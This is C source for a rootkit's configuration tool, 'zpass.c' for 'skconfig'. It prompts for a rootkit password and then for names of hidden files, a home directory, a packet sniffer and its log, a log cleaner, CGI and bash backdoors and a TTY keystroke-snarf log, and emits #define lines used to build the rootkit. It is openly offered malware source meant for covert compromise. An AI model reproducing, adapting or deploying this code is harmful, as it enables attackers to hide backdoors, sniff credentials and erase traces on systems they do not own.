/*
 * $Id: zpass.c, stuff for 'skconfig'
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <time.h>

#include "../include/sk.h"
#include "../include/sha1.h"
#include "../include/crypto.h"

#define SR (uint) ((ulong) rand() ^ ((ulong) rand() << 1))

int	main()
{
        struct  termios old, new;
	char    p1[256], p2[256], p3[256], p4[256], p5[256], p6[256], p7[256], p8[256], p9[256], *t;
	struct	hash h;
	int	i;

        tcgetattr(0, &old);
        new = old;
        new.c_lflag &= ~(ICANON | ECHO | ISIG);
        new.c_iflag &= ~(IXON | IXOFF);

	fprintf(stderr, "%s\n\n", BANNER);

	while (1) {
	        tcsetattr(0, TCSAFLUSH, &new);
		fprintf(stderr, "Please enter new rootkit password:");
		fflush(stderr);
		fgets(p1, 255, stdin);
		fprintf(stderr, "\nAgain, just to be sure:");
		fflush(stderr);
		fgets(p2, 255, stdin);
	        tcsetattr(0, TCSAFLUSH, &old);
		if (!*p1 || !*p2 || *p1 == '\n' || *p2 == '\n') {
			fprintf(stderr, "\n--- Aborted! ---\n");
			return 1;
		}
		if (!strcmp(p1, p2)) {
			fprintf(stderr, "\nOK, new password set.\n");
			strcpy(p9,p1);
			strtok(p9,"\n");
			printf("#define\tPASSWORD\t\"\%s\"\n",(char *)crypt(p9,"SK"));
			break;
		} else {
			fprintf(stderr,
				"\nMistyped password, next please...\n");
		}
	}
	hash160(p1, strlen(p1), &h);
	printf("#define\tHASHPASS\t\"");
	for (i = 0; i < 20; i++) {
		printf("\\x%02x", h.val[i]);
	}
	printf("\"\n");

	fprintf(stderr,"\nThis is what your rootkit files should end with to be hidden.\n");
	fprintf(stderr,"DONT FORGET TO NAME ALL YOUR BINARIES WITH THIS ENDING!!!\n");
	fprintf(stderr,"Example: bncsk, eggsk. You can leave this alone.\n");
	fprintf(stderr, "Magic file-hiding ending  [%s]: ", DEFHIDE);
	fflush(stderr);
	fgets(p1, 255, stdin);
	if ((!*p1) || (*p1 == '\n'))
	strcpy(p1, DEFHIDE);
	t = strchr(p1, '\n');
	if (t) {
	*t = 0;
									               }
	fprintf(stderr, "Home directory (Advice: change it!) [%s]: ", DEFHOME); fflush(stderr);
	fgets(p2, 255, stdin);
	if ((!*p2) || (*p2 == '\n'))
		strcpy(p2, DEFHOME);
		t = strchr(p2, '\n');
	if (t) {
		*t = 0;
	}
	
	fprintf(stderr, "Sniffer binary name [%s]: ", DEFSNF);
	fflush(stderr);
	fgets(p3, 255, stdin);
	if ((!*p3) || (*p3 == '\n'))
	strcpy(p3, DEFSNF);
	t = strchr(p3, '\n');
	if (t) {	
	*t = 0;
	}

	fprintf(stderr, "Sniffer tcp log filename [%s]: ", DEFSNFLOG); 
	fflush(stderr);
	fgets(p4, 255, stdin);
	if ((!*p4) || (*p4 == '\n'))
		strcpy(p4, DEFSNFLOG);
	t = strchr(p4, '\n');
	if (t) {
		*t = 0;
	}

	fprintf(stderr, "Logcleaner binary name [%s]: ", DEFWIPE);
	fflush(stderr);
	fgets(p5, 255, stdin);
	if ((!*p5) || (*p5 == '\n'))
	strcpy(p5, DEFWIPE);
	t = strchr(p5, '\n');
	if (t) {
	*t = 0;
	}
	
	fprintf(stderr, "Cgi-backdoor binary name [%s]: ", DEFCG);
	fflush(stderr);
	fgets(p6, 255, stdin);
	if ((!*p6) || (*p6 == '\n'))
	strcpy(p6, DEFWIPE);
	t = strchr(p6, '\n');
	if (t) {
	*t = 0;
	}

	fprintf(stderr, "Bash-backdoor binary name [%s]: ", DEFGW);
	fflush(stderr);
	fgets(p7, 255, stdin);
	if ((!*p7) || (*p7 == '\n'))
	strcpy(p7, DEFGW);
	t = strchr(p7, '\n');
	if (t) {
	*t = 0;
	}

	fprintf(stderr, "TTY Snarf log name [%s]: ", DEFTTY);
	fflush(stderr);
	fgets(p8, 255, stdin);
	if ((!*p8) || (*p8 == '\n'))
	strcpy(p8, DEFTTY);
	t = strchr(p8, '\n');
	if (t) {
	*t = 0;
	}

	printf("#define\tHOME\t\"%s\"\n", p2);
	printf("#define\tHIDESTR\t\"%s\"\n", p1);
	printf("#define\tSKSNIFFBIN\t\"%s\"\n", p3);
      	printf("#define\tSKSNIFFLOG\t\"%s\"\n", p4);
	printf("#define\tWIPER\t\"%s\"\n", p5);
        printf("#define\tCGIBDOR\t\"%s\"\n", p6);
	printf("#define\tSHBDOR\t\"%s\"\n", p7);
	printf("#define\tSKTTYLOG\t\"%s\"\n", p8);
		      
	srand(time(NULL));
	printf(	"#define\tMAGIC1\t0x%08x\n"
		"#define\tMAGIC2\t0x%08x\n", SR, SR);

	return 0;
}
